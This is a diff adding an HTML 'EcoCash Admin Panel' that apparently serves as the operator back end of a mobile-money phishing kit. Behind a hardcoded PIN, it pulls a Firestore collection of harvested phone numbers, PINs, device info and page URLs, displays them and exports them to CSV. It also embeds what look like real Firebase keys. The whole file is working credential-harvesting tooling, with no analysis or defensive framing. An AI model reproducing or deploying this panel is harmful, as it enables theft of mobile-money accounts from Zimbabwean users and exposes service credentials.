@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EcoCash Admin Panel</title>
+  
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+  
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background: #f0f2f5;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    
+    /* PIN Login Screen */
+    .pin-login {
+      max-width: 400px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      padding: 40px 30px;
+      text-align: center;
+    }
+    
+    .lock-icon {
+      font-size: 60px;
+      margin-bottom: 20px;
+    }
+    
+    .pin-login h2 {
+      color: #333;
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+    
+    .pin-login p {
+      color: #666;
+      margin-bottom: 30px;
+      font-size: 14px;
+    }
+    
+    .pin-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 30px;
+    }
+    
+    .pin-input {
+      width: 55px;
+      height: 65px;
+      border: 2px solid #e0e0e0;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 28px;
+      font-weight: bold;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    
+    .pin-input:focus {
+      border-color: #1c6aa6;
+    }
+    
+    .pin-input.error {
+      border-color: #dc3545;
+      animation: shake 0.2s ease-in-out;
+    }
+    
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+    
+    .pin-message {
+      color: #dc3545;
+      font-size: 14px;
+      margin-bottom: 20px;
+      min-height: 20px;
+    }
+    
+    .pin-submit {
+      background: #1c6aa6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 14px 30px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+      width: 100%;
+    }
+    
+    .pin-submit:hover {
+      background: #125c9c;
+    }
+    
+    .pin-footer {
+      margin-top: 20px;
+      color: #999;
+      font-size: 12px;
+    }
+    
+    /* Main Admin Panel (hidden initially) */
+    .admin-panel {
+      display: none;
+    }
+    
+    header {
+      background: linear-gradient(135deg, #1c6aa6, #125c9c);
+      color: white;
+      padding: 25px 30px;
+      border-radius: 10px;
+      margin-bottom: 25px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    header h1 {
+      font-size: 28px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    header h1 span:first-child { color: #ffd700; }
+    header h1 span:last-child { color: #ffffff; }
+    
+    .stats {
+      background: rgba(255,255,255,0.2);
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    
+    .logout-btn {
+      background: rgba(255,255,255,0.2);
+      color: white;
+      border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 8px;
+      padding: 8px 16px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    
+    .logout-btn:hover {
+      background: rgba(255,255,255,0.3);
+    }
+    
+    .controls {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 25px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      display: flex;
+      gap: 15px;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    
+    .search-box {
+      flex: 1;
+      min-width: 250px;
+      position: relative;
+    }
+    
+    .search-box input {
+      width: 100%;
+      padding: 12px 15px;
+      padding-left: 40px;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 15px;
+      transition: border-color 0.3s;
+    }
+    
+    .search-box input:focus {
+      outline: none;
+      border-color: #1c6aa6;
+    }
+    
+    .search-box::before {
+      content: "🔍";
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      opacity: 0.6;
+    }
+    
+    .filter-buttons {
+      display: flex;
+      gap: 10px;
+    }
+    
+    .filter-btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+      background: #f0f2f5;
+      color: #333;
+    }
+    
+    .filter-btn.active {
+      background: #1c6aa6;
+      color: white;
+    }
+    
+    .filter-btn:hover {
+      background: #e0e0e0;
+    }
+    
+    .filter-btn.active:hover {
+      background: #125c9c;
+    }
+    
+    .refresh-btn {
+      padding: 10px 20px;
+      background: #28a745;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .refresh-btn:hover {
+      background: #218838;
+    }
+    
+    .export-btn {
+      padding: 10px 20px;
+      background: #ffc107;
+      color: #333;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .export-btn:hover {
+      background: #e0a800;
+    }
+    
+    .table-container {
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      overflow: hidden;
+      margin-bottom: 25px;
+    }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    
+    thead {
+      background: #1c6aa6;
+      color: white;
+    }
+    
+    th {
+      padding: 15px;
+      text-align: left;
+      font-weight: 600;
+      font-size: 15px;
+    }
+    
+    td {
+      padding: 12px 15px;
+      border-bottom: 1px solid #e0e0e0;
+      font-size: 14px;
+    }
+    
+    tbody tr:hover {
+      background: #f8f9fa;
+    }
+    
+    tbody tr:last-child td {
+      border-bottom: none;
+    }
+    
+    .phone-number {
+      font-family: 'Courier New', monospace;
+      font-weight: 600;
+      color: #1c6aa6;
+    }
+    
+    .pin-display {
+      font-family: 'Courier New', monospace;
+      font-weight: 600;
+      letter-spacing: 2px;
+      color: #e12b2b;
+    }
+    
+    .timestamp {
+      color: #666;
+      font-size: 13px;
+    }
+    
+    .badge {
+      display: inline-block;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    .badge-success {
+      background: #d4edda;
+      color: #155724;
+    }
+    
+    .badge-info {
+      background: #cce5ff;
+      color: #004085;
+    }
+    
+    .no-data {
+      text-align: center;
+      padding: 50px;
+      color: #666;
+      font-size: 16px;
+    }
+    
+    .no-data i {
+      font-size: 48px;
+      display: block;
+      margin-bottom: 15px;
+      opacity: 0.3;
+    }
+    
+    .loading {
+      text-align: center;
+      padding: 50px;
+    }
+    
+    .loading-spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #1c6aa6;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .footer {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-top: 20px;
+    }
+    
+    @media (max-width: 768px) {
+      header {
+        flex-direction: column;
+        text-align: center;
+        gap: 15px;
+      }
+      
+      .controls {
+        flex-direction: column;
+      }
+      
+      .search-box {
+        width: 100%;
+      }
+      
+      .filter-buttons {
+        width: 100%;
+        justify-content: center;
+      }
+      
+      table {
+        font-size: 13px;
+      }
+      
+      th, td {
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- PIN Login Screen -->
+  <div class="container" id="pinLoginContainer">
+    <div class="pin-login">
+      <div class="lock-icon">🔒</div>
+      <h2>Admin Access</h2>
+      <p>Enter 4-digit PIN to view entries</p>
+      
+      <div class="pin-inputs" id="pinInputs">
+        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="pin1">
+        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="pin2">
+        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="pin3">
+        <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="pin4">
+      </div>
+      
+      <div class="pin-message" id="pinMessage"></div>
+      
+      <button class="pin-submit" id="pinSubmitBtn">Unlock</button>
+    </div>
+  </div>
+
+  <!-- Main Admin Panel (hidden initially) -->
+  <div class="container admin-panel" id="adminPanel">
+    <header>
+      <h1>
+        <span>Eco</span><span>Cash</span> Admin Panel
+      </h1>
+      <div class="stats" id="stats">
+        Total Entries: <span id="totalCount">0</span>
+      </div>
+      <button class="logout-btn" id="logoutBtn">
+        <span>🚪</span> Logout
+      </button>
+    </header>
+    
+    <div class="controls">
+      <div class="search-box">
+        <input type="text" id="searchInput" placeholder="Search by phone number or PIN...">
+      </div>
+      
+      <div class="filter-buttons">
+        <button class="filter-btn active" data-filter="all">All</button>
+        <button class="filter-btn" data-filter="today">Today</button>
+        <button class="filter-btn" data-filter="week">This Week</button>
+        <button class="filter-btn" data-filter="month">This Month</button>
+      </div>
+      
+      <button class="refresh-btn" id="refreshBtn">
+        <span>↻</span> Refresh
+      </button>
+      
+      <button class="export-btn" id="exportBtn">
+        <span>📥</span> Export CSV
+      </button>
+    </div>
+    
+    <div class="table-container">
+      <div id="loadingIndicator" class="loading">
+        <div class="loading-spinner"></div>
+        <p>Loading entries...</p>
+      </div>
+      
+      <div id="noDataMessage" class="no-data" style="display: none;">
+        <i>📭</i>
+        <p>No entries found</p>
+      </div>
+      
+      <table id="dataTable" style="display: none;">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Phone Number</th>
+            <th>PIN</th>
+            <th>Date & Time</th>
+            <th>Device Info</th>
+          </tr>
+        </thead>
+        <tbody id="tableBody">
+          <!-- Data will be inserted here -->
+        </tbody>
+      </table>
+    </div>
+    
+    <div class="footer">
+      <p>EcoCash Admin Panel • <span id="updateTime"></span></p>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ==================== FIREBASE CONFIG ====================
+      const firebaseConfig = {
+        apiKey: "AIzaSyBScpHGE2n7-qLHK5d_sqD165zMbFiP4NA",
+        authDomain: "eco-panel-3d06e.firebaseapp.com",
+        projectId: "eco-panel-3d06e",
+        storageBucket: "eco-panel-3d06e.firebasestorage.app",
+        messagingSenderId: "820242007704",
+        appId: "1:820242007704:web:c77e9610c3ac26a01e72ed"
+      };
+
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      const db = firebase.firestore();
+      const COLLECTION_NAME = 'ecocash_logins';
+
+      // ==================== DOM ELEMENTS ====================
+      const pinLoginContainer = document.getElementById('pinLoginContainer');
+      const adminPanel = document.getElementById('adminPanel');
+      const pinInputs = [
+        document.getElementById('pin1'),
+        document.getElementById('pin2'),
+        document.getElementById('pin3'),
+        document.getElementById('pin4')
+      ];
+      const pinMessage = document.getElementById('pinMessage');
+      const pinSubmitBtn = document.getElementById('pinSubmitBtn');
+      const logoutBtn = document.getElementById('logoutBtn');
+      
+      const tableBody = document.getElementById('tableBody');
+      const loadingIndicator = document.getElementById('loadingIndicator');
+      const noDataMessage = document.getElementById('noDataMessage');
+      const dataTable = document.getElementById('dataTable');
+      const totalCountSpan = document.getElementById('totalCount');
+      const updateTimeSpan = document.getElementById('updateTime');
+      const searchInput = document.getElementById('searchInput');
+      const refreshBtn = document.getElementById('refreshBtn');
+      const exportBtn = document.getElementById('exportBtn');
+      const filterBtns = document.querySelectorAll('.filter-btn');
+
+      // ==================== HARDCODED PIN ====================
+      const CORRECT_PIN = '9999';
+      let isAuthenticated = false;
+
+      // ==================== PIN AUTO-ADVANCE ====================
+      function focusNext(currentIndex) {
+        if (currentIndex < pinInputs.length - 1) {
+          pinInputs[currentIndex + 1].focus();
+        }
+      }
+
+      function focusPrev(currentIndex) {
+        if (currentIndex > 0) {
+          pinInputs[currentIndex - 1].focus();
+        }
+      }
+
+      pinInputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+          this.value = this.value.replace(/\D/g, '');
+          if (this.value.length === 1) {
+            focusNext(index);
+          }
+        });
+
+        input.addEventListener('keydown', function(e) {
+          if (e.key === 'Backspace') {
+            if (this.value.length === 0) {
+              e.preventDefault();
+              focusPrev(index);
+            }
+          } else if (e.key === 'ArrowLeft') {
+            e.preventDefault();
+            focusPrev(index);
+          } else if (e.key === 'ArrowRight') {
+            e.preventDefault();
+            focusNext(index);
+          } else {
+            if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
+              e.preventDefault();
+            }
+          }
+        });
+
+        input.addEventListener('paste', function(e) {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+          if (pasted.length > 0) {
+            this.value = pasted[0];
+            focusNext(index);
+          }
+        });
+      });
+
+      // ==================== PIN VALIDATION ====================
+      function validatePIN() {
+        const enteredPIN = pinInputs.map(input => input.value).join('');
+        
+        if (enteredPIN.length < 4) {
+          pinMessage.textContent = 'Please enter all 4 digits';
+          return false;
+        }
+        
+        if (enteredPIN === CORRECT_PIN) {
+          pinMessage.textContent = '';
+          pinInputs.forEach(input => {
+            input.classList.remove('error');
+          });
+          return true;
+        } else {
+          pinMessage.textContent = 'Incorrect PIN. Please try again.';
+          pinInputs.forEach(input => {
+            input.classList.add('error');
+            input.value = '';
+          });
+          pinInputs[0].focus();
+          return false;
+        }
+      }
+
+      // ==================== LOGIN/LOGOUT FUNCTIONS ====================
+      function unlockAdmin() {
+        if (validatePIN()) {
+          isAuthenticated = true;
+          pinLoginContainer.style.display = 'none';
+          adminPanel.style.display = 'block';
+          fetchEntries(); // Load data immediately
+        }
+      }
+
+      function logout() {
+        isAuthenticated = false;
+        adminPanel.style.display = 'none';
+        pinLoginContainer.style.display = 'block';
+        
+        // Clear PIN inputs
+        pinInputs.forEach(input => {
+          input.value = '';
+          input.classList.remove('error');
+        });
+        pinMessage.textContent = '';
+        pinInputs[0].focus();
+      }
+
+      pinSubmitBtn.addEventListener('click', unlockAdmin);
+
+      // Allow Enter key to submit
+      pinInputs.forEach(input => {
+        input.addEventListener('keypress', (e) => {
+          if (e.key === 'Enter') {
+            unlockAdmin();
+          }
+        });
+      });
+
+      logoutBtn.addEventListener('click', logout);
+
+      // ==================== STATE ====================
+      let allEntries = [];
+      let filteredEntries = [];
+      let currentFilter = 'all';
+      let searchTerm = '';
+
+      // ==================== HELPER FUNCTIONS ====================
+      function formatTimestamp(timestamp) {
+        if (!timestamp) return 'N/A';
+        
+        const date = timestamp.toDate();
+        const now = new Date();
+        
+        // Today
+        if (date.toDateString() === now.toDateString()) {
+          return `Today at ${date.toLocaleTimeString()}`;
+        }
+        // Yesterday
+        const yesterday = new Date(now);
+        yesterday.setDate(yesterday.getDate() - 1);
+        if (date.toDateString() === yesterday.toDateString()) {
+          return `Yesterday at ${date.toLocaleTimeString()}`;
+        }
+        // This week
+        const weekAgo = new Date(now);
+        weekAgo.setDate(weekAgo.getDate() - 7);
+        if (date > weekAgo) {
+          return date.toLocaleDateString('en-US', { weekday: 'long', hour: '2-digit', minute: '2-digit' });
+        }
+        // Older
+        return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
+      }
+
+      function formatPhoneNumber(phone) {
+        if (!phone) return 'N/A';
+        
+        // Extract digits only
+        const cleaned = phone.replace(/\D/g, '');
+        
+        // Format as +263 7XX XXX XXX
+        if (cleaned.startsWith('263') && cleaned.length === 12) {
+          // For numbers starting with 263 (e.g., 263712345678)
+          const match = cleaned.match(/(\d{3})(\d{3})(\d{3})(\d{3})/);
+          if (match) {
+            return `+${match[1]} ${match[2]} ${match[3]} ${match[4]}`;
+          }
+        } else if (cleaned.startsWith('0') && cleaned.length === 10) {
+          // For numbers starting with 0 (e.g., 0712345678)
+          const withoutZero = cleaned.substring(1);
+          const match = withoutZero.match(/(\d{3})(\d{3})(\d{3})/);
+          if (match) {
+            return `+263 ${match[1]} ${match[2]} ${match[3]}`;
+          }
+        } else if (cleaned.length === 9) {
+          // For numbers with just 9 digits
+          const match = cleaned.match(/(\d{3})(\d{3})(\d{3})/);
+          if (match) {
+            return `+263 ${match[1]} ${match[2]} ${match[3]}`;
+          }
+        }
+        
+        return phone; // Return original if can't format
+      }
+
+      function getUserAgentSummary(ua) {
+        if (!ua) return 'Unknown';
+        
+        if (ua.includes('Mobile')) return '📱 Mobile';
+        if (ua.includes('iPhone')) return '📱 iPhone';
+        if (ua.includes('Android')) return '📱 Android';
+        if (ua.includes('Windows')) return '💻 Windows';
+        if (ua.includes('Mac')) return '💻 Mac';
+        return '🌐 Web';
+      }
+
+      function filterEntriesByTime(entries, filter) {
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getFullYear(), now.getMonth(), now.getDate() - 7);
+        const monthAgo = new Date(now.getFullYear(), now.getMonth() - 1, now.getDate());
+        
+        return entries.filter(entry => {
+          if (!entry.timestamp) return filter === 'all';
+          
+          const entryDate = entry.timestamp.toDate();
+          
+          switch(filter) {
+            case 'today':
+              return entryDate >= today;
+            case 'week':
+              return entryDate >= weekAgo;
+            case 'month':
+              return entryDate >= monthAgo;
+            default:
+              return true;
+          }
+        });
+      }
+
+      function filterEntriesBySearch(entries, term) {
+        if (!term) return entries;
+        
+        term = term.toLowerCase();
+        return entries.filter(entry => {
+          const phone = (entry.phoneNumber || '').toLowerCase();
+          const pin = (entry.pin || '').toLowerCase();
+          return phone.includes(term) || pin.includes(term);
+        });
+      }
+
+      function updateDisplay() {
+        // Apply filters
+        let entries = filterEntriesByTime(allEntries, currentFilter);
+        entries = filterEntriesBySearch(entries, searchTerm);
+        filteredEntries = entries;
+        
+        // Update total count
+        totalCountSpan.textContent = allEntries.length;
+        
+        // Hide/show appropriate elements
+        if (loadingIndicator.style.display !== 'none') {
+          loadingIndicator.style.display = 'none';
+        }
+        
+        if (entries.length === 0) {
+          dataTable.style.display = 'none';
+          noDataMessage.style.display = 'block';
+          return;
+        }
+        
+        // Populate table
+        dataTable.style.display = 'table';
+        noDataMessage.style.display = 'none';
+        
+        tableBody.innerHTML = '';
+        
+        entries.forEach((entry, index) => {
+          const row = document.createElement('tr');
+          
+          const timestamp = entry.timestamp ? formatTimestamp(entry.timestamp) : 'N/A';
+          const formattedPhone = formatPhoneNumber(entry.phoneNumber);
+          const deviceInfo = getUserAgentSummary(entry.userAgent);
+          
+          row.innerHTML = `
+            <td>${index + 1}</td>
+            <td class="phone-number">${formattedPhone}</td>
+            <td class="pin-display">${entry.pin || 'N/A'}</td>
+            <td class="timestamp">${timestamp}</td>
+            <td><span class="badge badge-info">${deviceInfo}</span></td>
+          `;
+          
+          tableBody.appendChild(row);
+        });
+        
+        // Update footer timestamp
+        updateTimeSpan.textContent = `Last updated: ${new Date().toLocaleTimeString()}`;
+      }
+
+      // ==================== FETCH DATA FROM FIREBASE ====================
+      function fetchEntries() {
+        if (!isAuthenticated) return;
+        
+        loadingIndicator.style.display = 'block';
+        dataTable.style.display = 'none';
+        noDataMessage.style.display = 'none';
+        
+        db.collection(COLLECTION_NAME)
+          .orderBy('timestamp', 'desc')
+          .get()
+          .then((querySnapshot) => {
+            allEntries = [];
+            querySnapshot.forEach((doc) => {
+              allEntries.push({
+                id: doc.id,
+                ...doc.data()
+              });
+            });
+            
+            updateDisplay();
+          })
+          .catch((error) => {
+            console.error('Error fetching entries:', error);
+            loadingIndicator.style.display = 'none';
+            noDataMessage.style.display = 'block';
+            noDataMessage.innerHTML = `
+              <i>❌</i>
+              <p>Error loading data: ${error.message}</p>
+              <p style="font-size: 12px; margin-top: 10px;">Check Firebase configuration</p>
+            `;
+          });
+      }
+
+      // ==================== EXPORT TO CSV ====================
+      function exportToCSV() {
+        if (filteredEntries.length === 0) {
+          alert('No data to export');
+          return;
+        }
+        
+        const headers = ['Phone Number', 'PIN', 'Timestamp', 'User Agent', 'Page URL'];
+        const csvRows = [];
+        
+        // Add headers
+        csvRows.push(headers.join(','));
+        
+        // Add data rows
+        filteredEntries.forEach(entry => {
+          const row = [
+            `"${entry.phoneNumber || ''}"`,
+            `"${entry.pin || ''}"`,
+            `"${entry.timestamp ? entry.timestamp.toDate().toLocaleString() : ''}"`,
+            `"${entry.userAgent || ''}"`,
+            `"${entry.pageUrl || ''}"`
+          ];
+          csvRows.push(row.join(','));
+        });
+        
+        // Create and download CSV
+        const csvString = csvRows.join('\n');
+        const blob = new Blob([csvString], { type: 'text/csv' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.setAttribute('hidden', '');
+        a.setAttribute('href', url);
+        a.setAttribute('download', `ecocash_export_${new Date().toISOString().slice(0,10)}.csv`);
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+
+      // ==================== EVENT LISTENERS ====================
+      searchInput.addEventListener('input', (e) => {
+        searchTerm = e.target.value;
+        updateDisplay();
+      });
+
+      filterBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+          filterBtns.forEach(b => b.classList.remove('active'));
+          btn.classList.add('active');
+          currentFilter = btn.dataset.filter;
+          updateDisplay();
+        });
+      });
+
+      refreshBtn.addEventListener('click', fetchEntries);
+      exportBtn.addEventListener('click', exportToCSV);
+
+      // Auto-refresh every 30 seconds (only if authenticated)
+      setInterval(() => {
+        if (isAuthenticated) {
+          fetchEntries();
+        }
+      }, 30000);
+
+      // Focus first PIN input on load
+      pinInputs[0].focus();
+
+    })();
+  </script>
+</body>
+</html>
